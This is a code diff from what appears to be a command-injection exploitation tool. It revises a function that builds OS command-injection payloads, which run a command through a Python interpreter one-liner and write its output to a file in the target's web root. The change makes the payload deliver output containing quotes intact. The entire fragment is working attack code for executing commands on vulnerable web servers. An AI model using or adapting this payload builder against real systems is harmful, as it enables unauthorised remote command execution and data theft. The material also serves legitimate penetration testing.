@@ -145,12 +145,13 @@ def cmd_execution_alter_interpreter(separator, cmd, OUTPUT_TEXTFILE):
   else:
     settings.USER_APPLIED_CMD = cmd
     cmd_exec = settings.CMD_SUB_PREFIX + cmd + settings.CMD_SUB_SUFFIX
-    # Written as the one substitution the output arrives on, the way this technique's own command is:
-    # a second around it nests, which backticks cannot do, and the interpreter prints nothing for an
-    # outer one to carry back anyway.
+    # Handed to the interpreter as an argument rather than written into the program it is given to
+    # run. Written in, the output sat inside a quoted string there, so a quote of its own closed
+    # that string early and the interpreter wrote nothing to the file at all - the same shape the
+    # tempfile-based technique already uses to write this file, bytes and all.
     payload = (separator +
-              settings.LINUX_PYTHON_INTERPRETER + " -c \"f=open('" + settings.WEB_ROOT + OUTPUT_TEXTFILE + "','w')\nf.write('" +
-              cmd_exec + "')\nf.close()\n\""
+              settings.LINUX_PYTHON_INTERPRETER + " -c \"import os,sys\nopen('" + settings.WEB_ROOT + OUTPUT_TEXTFILE +
+              "','wb').write(os.fsencode(sys.argv[1]))\n\" \"" + cmd_exec + "\""
               )
 
     payload = checks.terminate_payload(payload, separator)
